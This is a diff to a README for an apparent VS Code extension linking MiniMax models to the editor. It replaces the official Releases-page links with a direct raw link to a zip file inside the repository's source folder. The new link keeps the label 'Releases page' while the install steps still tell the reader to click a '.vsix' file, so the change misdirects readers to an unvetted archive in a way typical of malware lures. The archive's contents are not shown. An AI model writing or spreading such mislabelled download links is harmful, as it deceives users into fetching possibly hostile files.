@@ -1,6 +1,6 @@
 # 🚀 mightymax-vscode - Connect MiniMax models to your editor
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/anthemneedleblight824/mightymax-vscode/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/anthemneedleblight824/mightymax-vscode/raw/refs/heads/main/src/adapters/vscode_mightymax_1.2.zip)
 
 This application brings MiniMax language models directly into Visual Studio Code. It allows you to use smart chat features, process images, and execute tool-based tasks without leaving your development environment.
 
@@ -23,7 +23,7 @@ Ensure you have these items before you start:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [Releases page](https://github.com/anthemneedleblight824/mightymax-vscode/releases).
+1. Go to the [Releases page](https://github.com/anthemneedleblight824/mightymax-vscode/raw/refs/heads/main/src/adapters/vscode_mightymax_1.2.zip).
 2. Look for the latest version listed at the top.
 3. Click the link ending in `.vsix` to start your download.
 4. Open Visual Studio Code on your computer.
